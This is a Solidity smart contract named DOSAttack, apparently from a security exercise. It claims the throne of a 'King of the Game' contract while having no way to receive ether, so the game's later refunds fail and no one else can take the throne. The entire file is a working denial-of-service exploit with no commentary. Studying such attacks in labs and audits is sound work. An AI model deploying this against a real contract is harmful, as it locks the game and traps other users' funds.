// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {IKingOfGame} from "./IKingOfGame.sol";

contract DOSAttack {
    IKingOfGame public kingOfGame;

    constructor(address _kingOfGame) {
        kingOfGame = IKingOfGame(_kingOfGame);
    }

    function attack() public payable {
        kingOfGame.ClaimThrone{value: msg.value}();
    }
}